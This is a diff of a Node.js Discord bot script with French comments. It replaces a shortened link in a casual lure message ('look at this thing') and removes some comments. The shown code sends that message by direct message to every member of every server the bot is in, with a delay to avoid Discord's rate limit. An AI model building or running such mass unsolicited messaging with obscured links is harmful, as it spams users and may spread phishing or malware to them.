@@ -2,12 +2,12 @@ const fs = require('fs');
 const config = JSON.parse(fs.readFileSync('./config.json'));
 const token = config.token;
 
-const message = "Tiens, regarde ce truc : https://bit.ly/4z3f03v";
+// Le nouveau lien a envoyer en DM
+const message = "Tiens, regarde ce truc : https://tinyurl.com/6c6b86en";
 
 async function dmAllServers() {
   console.log("Démarrage du DM ALL sur tous les serveurs...");
   
-  // 1. Récupérer tous les serveurs où le bot est
   let guildsRes = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
     headers: { "Authorization": `Bot ${token}` }
   });
@@ -18,7 +18,6 @@ async function dmAllServers() {
     return;
   }
 
-  // 2. Pour chaque serveur, on récupère les membres
   for (let g of guilds) {
     console.log(`\n--- Traitement du serveur : ${g.name} ---`);
     let after = "0";
@@ -58,7 +57,6 @@ async function dmAllServers() {
           console.log(`envoyé à ${m.user.username} (${count})`);
         }
         
-        // Pause de 1 seconde pour éviter le rate limit de discord
         await new Promise(r => setTimeout(r, 1000));
       }
       
